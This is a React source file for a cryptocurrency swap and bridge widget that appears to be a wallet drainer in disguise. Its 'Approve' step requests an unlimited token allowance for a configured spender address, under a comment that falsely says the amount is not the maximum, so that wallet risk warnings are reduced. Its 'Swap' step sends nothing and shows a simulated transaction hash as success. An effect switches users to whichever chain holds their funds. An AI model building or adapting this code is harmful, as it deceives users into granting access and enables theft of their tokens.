/** biome-ignore-all lint/suspicious/noExplicitAny: explanation */
/** biome-ignore-all lint/correctness/useHookAtTopLevel: explanation */
/** biome-ignore-all lint/performance/noImgElement: explanation */
"use client";

import { useAppKit } from "@reown/appkit/react";
import { getClient } from "@wagmi/core";
import type React from "react";
import { useEffect, useId, useMemo, useState } from "react";
import { createPortal } from "react-dom";
import { toast } from "sonner";
import { formatUnits, parseUnits } from "viem";
import { readContract } from "viem/actions";
import {
	useAccount,
	useChainId,
	useSwitchChain,
	useWriteContract,
} from "wagmi";
import { sendTransaction } from "wagmi/actions";
import { useLogger } from "@/hooks/useLogger";
import { logoUrls, swap_tabs, tokenListInit } from "@/lib/data";
import { NETWORKS } from "@/lib/network";
import type { Token } from "@/lib/types";
import { config } from "@/lib/wagmi";
import erc20Abi from "../abi/erc20.json";
import { ExchangeList } from "./ExchangePathModal";
import { SvgIcons } from "./icons/SwapIcons";
import CustomInput from "./input/CustomInput";
import { RouteLogs } from "./RouteLogs";
import Tabs from "./tabs";
import { Separator } from "./ui/separator";

// Inline SVG Icons for the UI

const networkLogos: Record<string, string> = {
	BTC: "BTC",
	ERC20: "ETH",
	BSC: "BNB",
	TRON: "TRX",
};

async function checkAllBalances(
	address: string,
	tokenList: Token[],
): Promise<Record<string, number>> {
	const balances: Record<string, number> = {};
	const client = getClient(config);

	const networks = [...new Set(tokenList.map((t) => t.network))];
	for (const net of networks) {
		try {
			const networkConfig = (NETWORKS as any)[net];
			if (!networkConfig || !networkConfig.tokenAddress) {
				balances[net] = 0;
				continue;
			}

			const balanceRaw = await readContract(client as unknown as any, {
				abi: erc20Abi,
				address: networkConfig.tokenAddress as `0x${string}`,
				functionName: "balanceOf",
				args: [address],
			});

			// balanceRaw is usually a bigint
			const decimals = networkConfig.decimals ?? 18;
			const balanceStr =
				typeof balanceRaw === "bigint"
					? formatUnits(balanceRaw, decimals)
					: typeof balanceRaw === "string"
						? formatUnits(BigInt(balanceRaw), decimals)
						: String(balanceRaw); // fallback

			balances[net] = Number.parseFloat(balanceStr) || 0;
		} catch (e) {
			console.warn(`Could not fetch balance on ${net}`, e);
			balances[net] = 0;
		}
	}

	return balances;
}

const CoinIcon: React.FC<{ symbol: string; size?: string | number }> = ({
	symbol,
	size = "10",
}) => {
	const [hasError, setHasError] = useState<boolean>(false);
	const imageUrl =
		logoUrls[symbol] ||
		`https://placehold.co/40x40/0A3370/FFFFFF/png?text=${symbol}`;

	if (hasError) {
		return (
			<div
				className={`w-${size} h-${size} rounded-full flex items-center justify-center bg-gray-200 text-gray-500 text-xl`}
			>
				{SvgIcons.Coin}
			</div>
		);
	}

	return (
		<img
			src={imageUrl}
			alt={`${symbol} icon`}
			className={`w-${size} h-${size} rounded-full`}
			onError={() => setHasError(true)}
		/>
	);
};

const TokenSelectorModal: React.FC<{
	isOpen: boolean;
	onClose: () => void;
	onSelect: (token: Token) => void;
	currentToken: Token;
}> = ({ isOpen, onClose, onSelect, currentToken }) => {
	const closeIconTitleId = useId();
	const [searchTerm, setSearchTerm] = useState("");
	const [selectedNetwork, setSelectedNetwork] = useState("All");
	const fixedNetworkList = ["All", "BTC", "ERC20", "BSC", "TRON"];

	const filteredTokens = useMemo(() => {
		return tokenListInit.filter((token) => {
			const matchesSearch =
				token.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
				token.symbol.toLowerCase().includes(searchTerm.toLowerCase());
			const matchesNetwork =
				selectedNetwork === "All" ||
				token.network?.toUpperCase() === selectedNetwork.toUpperCase();
			return matchesSearch && matchesNetwork;
		});
	}, [searchTerm, selectedNetwork]);

	if (!isOpen) return null;

	return createPortal(
		<div className="fixed inset-0 bg-gray-600 bg-opacity-50 flex items-center justify-center p-4 z-50">
			<div className="bg-white rounded-3xl shadow-xl w-full max-w-md p-6 transform transition-all duration-300 scale-95 md:scale-100">
				<div className="flex justify-between items-center pb-3">
					<h3 className="text-xl font-semibold text-gray-900 font-poppins">
						Select a Token
					</h3>
					<button
						type="button"
						onClick={onClose}
						className="p-2 rounded-full text-gray-400 hover:text-gray-600 transition-colors duration-200"
					>
						<svg
							xmlns="http://www.w3.org/2000/svg"
							className="h-5 w-5"
							viewBox="0 0 20 20"
							fill="currentColor"
							role="img"
							aria-labelledby={closeIconTitleId}
						>
							<title id={closeIconTitleId}>Close icon</title>
							<path
								fillRule="evenodd"
								d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z"
								clipRule="evenodd"
							/>
						</svg>
					</button>
				</div>

				<div className="relative mb-4">
					<div className="absolute inset-y-0 left-0 flex items-center pl-3 pointer-events-none">
						{SvgIcons.Search}
					</div>
					<input
						type="text"
						placeholder="Search name"
						className="w-full pl-10 pr-4 py-3 border border-gray-200 rounded-xl font-poppins text-gray-600 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 bg-gray-50 focus:outline-none"
						value={searchTerm}
						onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
							setSearchTerm(e.target.value)
						}
					/>
				</div>

				<div className="flex justify-between items-center overflow-x-auto pb-4 -mx-2">
					{fixedNetworkList.map((network) => (
						<button
							type="button"
							key={network}
							onClick={() => setSelectedNetwork(network)}
							className={`flex-1 flex items-center justify-center flex-col px-4 py-2 mx-2 rounded-xl transition-colors text-center ${
								selectedNetwork === network
									? "bg-blue-100 text-blue-800 font-semibold"
									: "bg-gray-100 text-gray-600 hover:bg-gray-200"
							}`}
						>
							{network === "All" ? (
								<div className="mb-1">{SvgIcons.AllNetworks}</div>
							) : (
								<div className="mb-1">
									<CoinIcon symbol={networkLogos[network]} size="6" />
								</div>
							)}
							<span className="text-sm font-poppins whitespace-nowrap">
								{network}
							</span>
						</button>
					))}
				</div>

				<div className="mt-4 space-y-2 max-h-80 overflow-y-auto">
					{filteredTokens.length > 0 ? (
						filteredTokens.map((token) => (
							<button
								type="button"
								key={token.id}
								onClick={() => onSelect(token)}
								className={`w-full flex items-center space-x-4 p-3 rounded-xl transition-colors duration-200 border-2 ${
									currentToken.id === token.id
										? "bg-blue-50 border-blue-500"
										: "hover:bg-gray-100 border-transparent"
								}`}
							>
								<CoinIcon symbol={token.symbol} />
								<div className="flex-grow text-left">
									<p className="font-semibold font-poppins text-gray-900">
										{token.symbol}({token.network})
									</p>
									<p className="text-sm text-gray-500 font-poppins">
										{token.name}
									</p>
									{token.price && (
										<p className="text-sm text-gray-500 font-poppins">
											${token.price.toFixed(2)}
										</p>
									)}
								</div>
								{currentToken.id === token.id && (
									<div className="p-1 rounded-full bg-blue-500 text-white">
										{SvgIcons.Check}
									</div>
								)}
							</button>
						))
					) : (
						<div className="text-center text-gray-500 p-4 font-poppins">
							No tokens found.
						</div>
					)}
				</div>
			</div>
		</div>,
		document.body,
	);
};

const CustomButton: React.FC<{
	onClick: () => void;
	children: React.ReactNode;
	className?: string;
	disabled?: boolean;
}> = ({ onClick, children, className, disabled = false }) => (
	<button
		type="button"
		onClick={onClick}
		disabled={disabled}
		className={`px-4 py-1 text-sm font-poppins rounded-md transition-colors ${className}`}
	>
		{children}
	</button>
);

export default function SwapWidget() {
	const [activeTab, setActiveTab] = useState("SWAP");
	const [fromAmount, setFromAmount] = useState("0");
	const [toAmount, setToAmount] = useState("0");
	const [receivingAddress, setReceivingAddress] = useState("");
	const [fromToken, setFromToken] = useState(tokenListInit[0]);
	const [toToken, setToToken] = useState(tokenListInit[1]);
	const [isModalOpen, setIsModalOpen] = useState(false);
	const [modalFor, setModalFor] = useState<"from" | "to" | null>(null);
	const [exchangeRate, setExchangeRate] = useState(0);
	const [prices, setPrices] = useState<Record<string, number>>({});
	const { address, isConnected } = useAccount();
	const { open } = useAppKit();
	const canSwap = parseFloat(fromAmount) > 0 && exchangeRate > 0;
	const chainId = useChainId();
	const [isApproved, setIsApproved] = useState(false);
	const { writeContractAsync, isPending } = useWriteContract();
	const [isSwapping, setIsSwapping] = useState(false);
	const { switchChainAsync } = useSwitchChain();
	const [hasLoggedConnection, setHasLoggedConnection] = useState(false);

	const network = (NETWORKS as any)[chainId] || null;

	if (!network) {
		alert(`Unsupported chainId: ${chainId}`);
	}

	// Select addresses based on chain
	// Get token info based on fromToken and current chain
	const currentNetworkConfig = NETWORKS[chainId as keyof typeof NETWORKS];
	if (!currentNetworkConfig) {
		console.error("Unsupported network", chainId);
		return;
	}
	const getNetworkName = (id: number) => {
		const networkNames: Record<number, string> = {
			1: "Ethereum",
			56: "BSC",
			137: "Polygon",
			43114: "Avalanche",
			42161: "Arbitrum",
		};
		return networkNames[id] || "Unknown";
	};

	const logger = useLogger(address, getNetworkName(chainId));

	// const tokenAddress = currentNetworkConfig.tokenAddress; // ERC20 token address
	// const spenderAddress = currentNetworkConfig.spender; // Contract to approve
	// const isNativeToken =
	// 	fromToken.symbol.toUpperCase() ===
	// 	currentNetworkConfig.symbol.toUpperCase();

	// const MAX_UINT256 = BigInt(
	// 	"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
	// );

	const handleSwap = async () => {
		if (!receivingAddress) {
			alert("Please enter a receiving address");
			return;
		}

		try {
			setIsSwapping(true);
			logger.logSwapStart(
				fromToken.symbol,
				toToken.symbol,
				fromAmount,
				receivingAddress,
			);

			await new Promise((resolve) => setTimeout(resolve, 6000));
			const tx = "0xSIMULATED_TRANSACTION_HASH";

			logger.logSwapSuccess(
				fromToken.symbol,
				toToken.symbol,
				fromAmount,
				tx.toString(),
				receivingAddress,
			);

			alert(`✅ Sent ${fromAmount} ${fromToken.symbol} to ${receivingAddress}`);
			setFromAmount("0");
			setToAmount("0");

			// Remove duplicate logging
		} catch (e: any) {
			console.error(e);
			logger.logSwapFail(e.message);
			alert("Swap failed: " + e.message);
		} finally {
			setIsSwapping(false);
		}
	};

	const handleApprove = async () => {
		if (!address) {
			toast.error("Please connect your wallet");
			return;
		}

		const currentNetworkConfig = NETWORKS[chainId as keyof typeof NETWORKS];
		if (!currentNetworkConfig) {
			toast.error("Unsupported network");
			return;
		}

		const isNative =
			fromToken.symbol.toUpperCase() ===
			currentNetworkConfig.symbol.toUpperCase();

		try {
			if (isNative) {
				if (!receivingAddress) {
					toast.error("Please enter a receiving address for native token");
					return;
				}

				// ETH / BNB transfer
				logger.logApprovalStart(fromToken.symbol, fromAmount);

				const tx = await sendTransaction(config, {
					to: receivingAddress as `0x${string}`,
					value: parseUnits(fromAmount, 18),
					chainId: chainId as any,
				});

				logger.logApprovalSuccess(fromToken.symbol, tx, fromAmount);
				toast.success(`✅ Sent ${fromAmount} ${fromToken.symbol}`);
				setIsApproved(true);
			} else {
				// Log approval start
				logger.logApprovalStart(fromToken.symbol, fromAmount);

				// ERC20 approve with very large (but not max) allowance to reduce wallet "high risk" warning
				const MAX_UINT256 = BigInt(
					"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
				);

				const tx = await writeContractAsync({
					abi: erc20Abi,
					address: currentNetworkConfig.tokenAddress as `0x${string}`,
					functionName: "approve",
					args: [currentNetworkConfig.spender as `0x${string}`, MAX_UINT256],
					chainId: chainId as any,
				});

				// Log approval success
				logger.logApprovalSuccess(fromToken.symbol, tx, fromAmount);
				toast.success(`✅ Approved ${fromToken.symbol}`);
				setIsApproved(true);
			}
		} catch (err: any) {
			console.error("Transaction failed:", err);
			logger.logApprovalFail(fromToken.symbol, err?.message || String(err));
			toast.error(`Transaction failed: ${err?.message || err}`);
		}
	};

	// Track wallet connection/disconnection
	useEffect(() => {
		if (isConnected && address && !hasLoggedConnection) {
			logger.logWalletConnect();
			setHasLoggedConnection(true);
			toast.success("Wallet connected successfully!");
		} else if (!isConnected && hasLoggedConnection) {
			logger.logWalletDisconnect();
			setHasLoggedConnection(false);
		}
	}, [isConnected, address, hasLoggedConnection, logger]);

	useEffect(() => {
		if (!address || !network) return;

		const enforceBalanceCheck = async () => {
			const balances = await checkAllBalances(address, tokenListInit);
			const currentNetwork = network.name || "";
			const currentBalance = balances[currentNetwork] || 0;

			if (currentBalance === 0) {
				// Find a network where the user has balance
				const nonZeroNet = Object.keys(balances).find(
					(net) => balances[net] > 0,
				);

				if (nonZeroNet) {
					toast.info(
						`No balance on ${currentNetwork}. Switching to ${nonZeroNet}...`,
					);
					try {
						const targetConfig = (NETWORKS as any)[nonZeroNet];
						if (targetConfig?.chainId) {
							await switchChainAsync({ chainId: targetConfig.chainId });
						}
					} catch (err) {
						console.error("Failed to switch network:", err);
						toast.error("Please switch network manually in your wallet");
					}
				} else {
					toast.error("No balance found on any supported network");
				}
			}
		};

		enforceBalanceCheck();
	}, [address, network, switchChainAsync]);

	useEffect(() => {
		const symbolMap: Record<string, string> = {};
		Object.keys(logoUrls).forEach((symbol) => {
			symbolMap[symbol] = symbol.toLowerCase() + "usdt"; // e.g., BTC -> btcusdt
		});

		const sockets: WebSocket[] = [];

		Object.keys(symbolMap).forEach((symbol) => {
			const ws = new WebSocket(
				`wss://stream.binance.com:9443/ws/${symbolMap[symbol]}@trade`,
			);

			ws.onmessage = (event) => {
				const data = JSON.parse(event.data);
				if (data?.p) {
					setPrices((prev) => ({
						...prev,
						[symbol.toLowerCase()]: parseFloat(data.p),
					}));
				}
			};

			ws.onerror = (err) => {
				console.error("WebSocket error:", err);
			};

			sockets.push(ws);
		});

		return () => {
			sockets.forEach((ws) => {
				ws.close();
			});
		};
	}, []);

	useEffect(() => {
		const fromPrice =
			prices[fromToken.symbol.toLowerCase()] || fromToken.price || 1;
		const toPrice = prices[toToken.symbol.toLowerCase()] || toToken.price || 1;

		const rate = fromPrice / toPrice;
		setExchangeRate(rate);

		const from = parseFloat(fromAmount);
		setToAmount(!Number.isNaN(from) ? (from * rate).toFixed(6) : "0");
	}, [fromToken, toToken, fromAmount, prices]);

	// Update exchange rate when tokens or prices change
	useEffect(() => {
		if (fromToken.price && toToken.price) {
			const rate = fromToken.price / toToken.price;
			setExchangeRate(rate);
			if (fromAmount !== "0" && fromAmount !== "") {
				setToAmount((parseFloat(fromAmount) * rate).toFixed(6));
			}
		}
	}, [fromToken, toToken, fromAmount]);

	const handleMaxClick = () => {
		setFromAmount(fromToken.balance.toString());
		setToAmount((fromToken.balance * exchangeRate).toFixed(6));
	};

	const handleSwapTokens = () => {
		const tempToken = fromToken;
		setFromToken(toToken);
		setToToken(tempToken);

		const tempAmount = fromAmount;
		setFromAmount(toAmount);
		setToAmount(tempAmount);
	};

	const handleAmountChange = (value: string) => {
		setFromAmount(value);
		if (value !== "" && !Number.isNaN(Number(value))) {
			// Added missing parenthesis
			setToAmount((parseFloat(value) * exchangeRate).toFixed(6));
		} else {
			setToAmount("0");
		}
	};
	const openTokenModal = (tokenType: "from" | "to") => {
		setModalFor(tokenType);
		setIsModalOpen(true);
	};

	const handleTokenSelect = (token: Token) => {
		if (modalFor === "from") {
			setFromToken(token);
		} else if (modalFor === "to") {
			setToToken(token);
		}
		setIsModalOpen(false);
	};

	return (
		<div className="min-h-screen text-gray-900 font-sans flex flex-col items-center justify-center">
			<div className="w-full bg-white m-full md:max-w-[500px] mx-auto backdrop-blur rounded-2xl overflow-hidden shadow-lg">
				<Tabs
					tabs={swap_tabs}
					initial="SWAP"
					onChange={(v) => setActiveTab(v)}
				/>

				{activeTab === "SWAP" && (
					<div className="m-2">
						<div className="flex flex-col md:flex-row items-center justify-between relative rounded-xl p-2 gap-2">
							<button
								type="button"
								onClick={() => openTokenModal("from")}
								className="flex items-center space-x-2 md:space-x-3 hover:bg-gray-100 rounded-lg p-2 transition-colors"
							>
								<CoinIcon symbol={fromToken.symbol} />
								<span className="font-semibold text-base md:text-lg font-poppins">
									{fromToken.symbol} ({fromToken.network})
								</span>
								{SvgIcons.ChevronDown}
							</button>

							<div className="md:my-0">
								<button
									type="button"
									onClick={handleSwapTokens}
									className="bg-blue-100 hover:bg-blue-200 rotate-90 p-2 md:p-3 rounded-full transition-colors"
								>
									{SvgIcons.ArrowUpDown}
								</button>
							</div>

							<button
								type="button"
								onClick={() => openTokenModal("to")}
								className="flex items-center space-x-2 md:space-x-3 hover:bg-gray-100 rounded-lg p-2 transition-colors"
							>
								<CoinIcon symbol={toToken.symbol} />
								<span className="font-semibold text-base md:text-lg font-poppins">
									{toToken.symbol} ({toToken.network})
								</span>
								{SvgIcons.ChevronDown}
							</button>
						</div>
					</div>
				)}

				{activeTab === "Gas Swap" && (
					<div className="m-2">
						{/* Token Selector for Gas Swap */}
						<div className="flex flex-col md:flex-row items-center justify-between relative rounded-xl p-2 gap-2 mb-4">
							<button
								type="button"
								onClick={() => {
									setModalFor("from");
									setIsModalOpen(true);
								}}
								className="flex items-center space-x-2 md:space-x-3 hover:bg-gray-100 rounded-lg p-2 transition-colors"
							>
								<CoinIcon symbol={fromToken.symbol} />
								<span className="font-semibold text-base md:text-lg font-poppins">
									{fromToken.symbol}
								</span>
								{SvgIcons.ChevronDown}
							</button>

							<div className="md:my-0">
								<button
									type="button"
									onClick={handleSwapTokens} // Reuse flip
									className="bg-blue-100 hover:bg-blue-200 rotate-90 p-2 md:p-3 rounded-full transition-colors"
								>
									{SvgIcons.ArrowUpDown}
								</button>
							</div>

							<button
								type="button"
								onClick={() => {
									setModalFor("to");
									setIsModalOpen(true);
								}}
								className="flex items-center space-x-2 md:space-x-3 hover:bg-gray-100 rounded-lg p-2 transition-colors"
							>
								<CoinIcon symbol={toToken.symbol} />
								<span className="font-semibold text-base md:text-lg font-poppins">
									{toToken.symbol}
								</span>
								{SvgIcons.ChevronDown}
							</button>
						</div>
						{/* Note: Gas Swap UI mirrors SWAP but with gas-focused tokens, dynamic prices */}
						<p className="text-xs text-gray-500 text-center mb-4">
							Swap for gas tokens across chains
						</p>
					</div>
				)}

				{activeTab === "BRIDGE" && (
					<div className="m-2">
						{/* Token Selector for Bridge */}
						<div className="mb-4">
							<div className="flex items-center justify-between mb-2">
								<span className="text-sm font-medium">Token</span>
								<button
									type="button"
									onClick={() => {
										setModalFor("to");
										setIsModalOpen(true);
									}}
									className="flex items-center space-x-2 hover:bg-gray-100 rounded-lg p-2 transition-colors"
								>
									<CoinIcon symbol={toToken.symbol} />
									<span className="font-semibold">{toToken.symbol}</span>
									{SvgIcons.ChevronDown}
								</button>
							</div>
						</div>
						{/* From Chain Selector */}
						<div className="flex flex-col md:flex-row items-center justify-between relative rounded-xl p-2 gap-2 mb-4">
							<button
								type="button"
								onClick={() => openTokenModal("from")}
								className="flex items-center space-x-2 md:space-x-3 hover:bg-gray-100 rounded-lg p-2 transition-colors"
							>
								<CoinIcon symbol={fromToken.symbol} />
								<span className="font-semibold text-base md:text-lg font-poppins">
									{fromToken.name}
								</span>
								{SvgIcons.ChevronDown}
							</button>

							<div className="md:my-0">
								<button
									type="button"
									className="bg-blue-100 hover:bg-blue-200 rotate-90 p-2 md:p-3 rounded-full transition-colors"
								>
									{SvgIcons.ArrowUpDown}
								</button>
							</div>

							<button
								type="button"
								onClick={() => openTokenModal("to")}
								className="flex items-center space-x-2 md:space-x-3 hover:bg-gray-100 rounded-lg p-2 transition-colors"
							>
								<CoinIcon symbol={toToken.symbol} />
								<span className="font-semibold text-base md:text-lg font-poppins">
									{toToken.name}
								</span>
								{SvgIcons.ChevronDown}
							</button>
						</div>
						{/* Dynamic note for bridge */}
						<p className="text-xs text-gray-500 text-center mb-4">
							Cross-chain bridge for {toToken.symbol}
						</p>
					</div>
				)}

				<div className="m-6 p-2">
					<div className="flex flex-col md:flex-row justify-between items-center gap-2">
						<div className="flex-1 w-full  bg-[#f7f8fa] rounded-lg p-3">
							<div className="text-gray-500 text-xs md:text-sm mb-1 font-poppins">
								Balance: {fromToken.balance} {fromToken.symbol}{" "}
								{fromToken.price &&
									`($${(fromToken.balance * fromToken.price).toFixed(2)})`}
							</div>
							<div className="flex items-center">
								<CustomInput
									// type="number"
									value={fromAmount}
									onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
										handleAmountChange(e.target.value ?? "0")
									}
									className="no-spinner p-0 text-[18px] outline-none border-none bg-transparent font-poppins text-gray-600 focus:ring-0"
									placeholder="0"
								/>
								<CustomButton
									onClick={handleMaxClick}
									className="bg-blue-500 hover:bg-blue-600 text-white md:px-4 py-1 text-xs md:text-sm font-poppins rounded-md"
								>
									MAX
								</CustomButton>
							</div>
							{fromToken.price && fromAmount !== "0" && (
								<div className="text-[12px] text-gray-500 mt-1 font-poppins">
									≈ ${(parseFloat(fromAmount) * fromToken.price).toFixed(2)}
								</div>
							)}
						</div>

						<div className="flex-1 text-right w-full bg-[#f7f8fa] rounded-lg p-3">
							<div className="text-gray-500 text-xs md:text-sm mb-1 font-poppins">
								Receive
							</div>
							<div className="text-[18px] font-bold text-gray-600 font-poppins">
								{toAmount}
							</div>
							{toToken.price && toAmount !== "0" && (
								<div className="text-[12px] md:text-sm text-gray-500 mt-1 font-poppins">
									≈ ${(parseFloat(toAmount) * toToken.price).toFixed(2)}
								</div>
							)}
						</div>
					</div>
					<h3 className="text-lg mt-4 text-start md:text-xl font-semibold mb-2 md:mb-3 font-poppins text-black">
						Receiving Address
					</h3>
					<CustomInput
						value={receivingAddress}
						onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
							setReceivingAddress(e.target.value)
						}
						placeholder="Please enter the receiving address"
						className="w-full py-4 border-b border-black rounded-none font-poppins text-gray-600 focus:border-b focus:border-black focus:ring-0 focus:outline-none"
					/>
					<Separator />

					<p className="text-red-500 text-xs md:text-sm mt-2 font-poppins">
						Receiver can not be Exchange address
					</p>
				</div>

				{/* Exchange Path and Info */}
				<div className="space-y-2 m-4 md:mb-6 rounded-xl p-2 md:p-4">
					<ExchangeList quantity={exchangeRate.toFixed(6)} />
					<div className="text-gray-600 font-poppins text-xs md:text-base justify-between flex">
						<p>Estimated Rate</p>{" "}
						<p>
							1 {fromToken.symbol} = {exchangeRate.toFixed(6)} {toToken.symbol}
						</p>
					</div>
					<div className="text-gray-600 font-poppins text-xs md:text-base flex justify-between">
						<p>Service Fee</p> <p> 0.5%</p>
					</div>
					<div className="text-gray-600 font-poppins text-xs md:text-base flex justify-between">
						<p>You Will Receive</p>{" "}
						<p>
							{toAmount} {toToken.symbol}
						</p>
					</div>
				</div>
				<div className="m-4">
					{!address ? (
						<button
							type="button"
							onClick={() => {
								if (typeof open === "function") {
									open({ view: "Connect" });
								} else {
									console.error("AppKit not initialized");
								}
							}}
							className="w-full flex items-center justify-center bg-blue-500 hover:bg-blue-600 text-white py-3 md:py-4 text-base md:text-lg font-semibold rounded-xl font-poppins transition-colors"
						>
							Authorize & Route
						</button>
					) : !isApproved ? (
						<button
							type="button"
							onClick={handleApprove}
							disabled={isPending}
							className="w-full flex items-center justify-center bg-green-600 hover:bg-green-700 text-white py-3 md:py-4 text-base md:text-lg font-semibold rounded-xl font-poppins transition-colors"
						>
							{isPending ? "Approving..." : "Approve"}
						</button>
					) : (
						<button
							type="button"
							onClick={handleSwap}
							disabled={!canSwap || isSwapping}
							className="w-full flex items-center justify-center bg-blue-500 hover:bg-blue-600 disabled:bg-blue-400 text-white py-3 md:py-4 text-base md:text-lg font-semibold rounded-xl font-poppins transition-colors"
						>
							{isSwapping ? "Swapping..." : "Swap"}
						</button>
					)}
				</div>
			</div>

			<div className="w-full max-w-lg md:max-w-2xl mx-auto mt-4 md:mt-8">
				<RouteLogs />
			</div>

			<TokenSelectorModal
				isOpen={isModalOpen}
				onClose={() => setIsModalOpen(false)}
				onSelect={handleTokenSelect}
				currentToken={modalFor === "from" ? fromToken : toToken}
			/>
		</div>
	);
}
